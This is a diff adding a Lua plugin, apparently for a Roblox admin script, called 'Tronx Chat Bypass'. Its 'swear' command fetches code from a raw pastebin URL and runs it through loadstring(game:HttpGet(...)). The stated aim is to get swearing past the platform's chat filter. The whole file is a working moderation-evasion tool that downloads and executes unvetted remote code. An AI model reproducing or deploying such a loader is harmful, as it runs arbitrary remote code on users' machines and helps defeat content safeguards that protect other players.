@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "Tronx Chat Bypass",
+	["PluginDescription"] = "Epic chat bypasser",
+	["Commands"] = {
+		["swear"] = {
+			["Description"] = "Swear",
+			["Aliases"] = {'tronx', 'cb', 'chat'},
+			["Function"] = function(args,speaker)
+				 loadstring(game:HttpGet("https://pastebin.com/raw/Hkb9n916"))()
+			end,
+		},
+	},
+}
+
+return Plugin
